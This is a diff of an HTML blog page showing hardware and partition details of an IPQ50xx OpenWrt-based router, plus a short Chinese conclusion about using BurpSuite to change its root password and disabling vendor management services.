+DISTRIB_REVISION=&#39;079f770+r49254&#39;
+DISTRIB_CODENAME=&#39;chaos_calmer&#39;
+DISTRIB_TARGET=&#39;ipq/ipq50xx&#39;
+DISTRIB_DESCRIPTION=&#39;OpenWrt Chaos Calmer 15.05.1&#39;
+DISTRIB_TAINTS=&#39;no-all busybox override&#39;
+</code></pre><h4 id=etcopenwrt_version>/etc/openwrt_version</h4><pre tabindex=0><code>15.05.1
+</code></pre><h4 id=cpuinfo>cpuinfo</h4><pre tabindex=0><code>processor       : 0
 model name      : ARMv7 Processor rev 4 (v7l)
 BogoMIPS        : 48.00
 Features        : half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm aes pmull sha1 sha2 crc32 
@@ -241,44 +73,30 @@ CPU revision    : 4
 Hardware        : Generic DT based system
 Revision        : 0000
 Serial          : 0000000000000000
-</code></pre><h4 id=mtd分区信息>mtd分区信息</h4>
-<pre tabindex=0><code>dev:    size   erasesize  name
-mtd0: 00080000 00020000 &quot;0:SBL1&quot;
-mtd1: 00080000 00020000 &quot;0:MIBIB&quot;
-mtd2: 00040000 00020000 &quot;0:BOOTCONFIG&quot;
-mtd3: 00040000 00020000 &quot;0:BOOTCONFIG1&quot;
-mtd4: 00100000 00020000 &quot;0:QSEE_1&quot;
-mtd5: 00100000 00020000 &quot;0:QSEE&quot;
-mtd6: 00040000 00020000 &quot;0:DEVCFG_1&quot;
-mtd7: 00040000 00020000 &quot;0:DEVCFG&quot;
-mtd8: 00040000 00020000 &quot;0:CDT&quot;
-mtd9: 00040000 00020000 &quot;0:CDT_1&quot;
-mtd10: 00080000 00020000 &quot;0:APPSBLENV&quot;
-mtd11: 00140000 00020000 &quot;0:APPSBL&quot;
-mtd12: 00140000 00020000 &quot;0:APPSBL_1&quot;
-mtd13: 00100000 00020000 &quot;0:ART&quot;
-mtd14: 00080000 00020000 &quot;0:TRAINING&quot;
-mtd15: 03000000 00020000 &quot;rootfs_1&quot;
-mtd16: 03000000 00020000 &quot;rootfs&quot;
-mtd17: 00a40000 00020000 &quot;TZPARAM&quot;
-mtd18: 00a40000 00020000 &quot;TZBAK&quot;
-mtd19: 002fce60 0001f000 &quot;kernel&quot;
-mtd20: 00367000 0001f000 &quot;wifi_fw&quot;
-mtd21: 00004000 0001f000 &quot;bt_fw&quot;
-mtd22: 01303000 0001f000 &quot;ubi_rootfs&quot;
-mtd23: 00c1c000 0001f000 &quot;rootfs_data&quot;
-mtd24: 00706000 0001f000 &quot;tzparam&quot;
-</code></pre><h1 id=结语>结语</h1>
-<p>在这次摸索过程中，体会到了BurpSuite这个工具的强大（内置浏览器真的太舒服辣），虽然最后还是走运才成功把root密码给改掉hhh。</p>
-<p>将ANDLINK、FOTA、TR069服务关闭后，接下来我准备用这台路由器替换老的新3路由，但遗憾的是OpenWrt官方还未对IPQ50xx适配，可能还是要等QSDK释出ipq50XX的源码（但貌似<a href="https://source.codeaurora.org/quic/cc-qrdk/oss/system/openwrt/log/?h=NHSS.QSDK.12.0.r9&qt=grep&q=ipq50xx">QSDK的代码树</a>中已经有了？）才可能有机会舒服地用上OpenWrt。</p>
-</main>
-<div id=comments>
-<hr>
-<script src=https://utteranc.es/client.js repo=KB5201314/KB5201314.github.io issue-term=pathname label="💬 comments 💬" theme=github-light crossorigin=anonymous async></script>
-</div>
-<footer>
-<hr>
-© imlk 2017 &ndash; 2021 | <a href=https://blog.imlk.top>imlk's blog</a> | <a href=https://github.com/KB5201314/>Github</a> | <a href=mailto:me@imlk.top>Email</a> | <a href=https://beian.miit.gov.cn/>京ICP备 - 2020042968号</a>
-</footer>
-</body>
-</html>
+</code></pre><h4 id=mtd分区信息>mtd分区信息</h4><pre tabindex=0><code>dev:    size   erasesize  name
+mtd0: 00080000 00020000 &#34;0:SBL1&#34;
+mtd1: 00080000 00020000 &#34;0:MIBIB&#34;
+mtd2: 00040000 00020000 &#34;0:BOOTCONFIG&#34;
+mtd3: 00040000 00020000 &#34;0:BOOTCONFIG1&#34;
+mtd4: 00100000 00020000 &#34;0:QSEE_1&#34;
+mtd5: 00100000 00020000 &#34;0:QSEE&#34;
+mtd6: 00040000 00020000 &#34;0:DEVCFG_1&#34;
+mtd7: 00040000 00020000 &#34;0:DEVCFG&#34;
+mtd8: 00040000 00020000 &#34;0:CDT&#34;
+mtd9: 00040000 00020000 &#34;0:CDT_1&#34;
+mtd10: 00080000 00020000 &#34;0:APPSBLENV&#34;
+mtd11: 00140000 00020000 &#34;0:APPSBL&#34;
+mtd12: 00140000 00020000 &#34;0:APPSBL_1&#34;
+mtd13: 00100000 00020000 &#34;0:ART&#34;
+mtd14: 00080000 00020000 &#34;0:TRAINING&#34;
+mtd15: 03000000 00020000 &#34;rootfs_1&#34;
+mtd16: 03000000 00020000 &#34;rootfs&#34;
+mtd17: 00a40000 00020000 &#34;TZPARAM&#34;
+mtd18: 00a40000 00020000 &#34;TZBAK&#34;
+mtd19: 002fce60 0001f000 &#34;kernel&#34;
+mtd20: 00367000 0001f000 &#34;wifi_fw&#34;
+mtd21: 00004000 0001f000 &#34;bt_fw&#34;
+mtd22: 01303000 0001f000 &#34;ubi_rootfs&#34;
+mtd23: 00c1c000 0001f000 &#34;rootfs_data&#34;
+mtd24: 00706000 0001f000 &#34;tzparam&#34;
+</code></pre><h1 id=结语>结语</h1><p>在这次摸索过程中，体会到了BurpSuite这个工具的强大（内置浏览器真的太舒服辣），虽然最后还是走运才成功把root密码给改掉hhh。</p><p>将ANDLINK、FOTA、TR069服务关闭后，接下来我准备用这台路由器替换老的新3路由，但遗憾的是OpenWrt官方还未对IPQ50xx适配，可能还是要等QSDK释出ipq50XX的源码（但貌似<a href="https://source.codeaurora.org/quic/cc-qrdk/oss/system/openwrt/log/?h=NHSS.QSDK.12.0.r9&qt=grep&q=ipq50xx">QSDK的代码树</a>中已经有了？）才可能有机会舒服地用上OpenWrt。</p></main><div id=comments><hr><script src=https://utteranc.es/client.js repo=KB5201314/KB5201314.github.io issue-term=pathname label='💬 comments 💬' theme=github-light crossorigin=anonymous async></script></div><footer><hr>© imlk 2017 &ndash; 2021 | <a href=https://blog.imlk.top>imlk's blog</a> | <a href=https://github.com/KB5201314/>Github</a> | <a href=mailto:me@imlk.top>Email</a> | <a href=https://beian.miit.gov.cn/>京ICP备 - 2020042968号</a></footer></body></html>
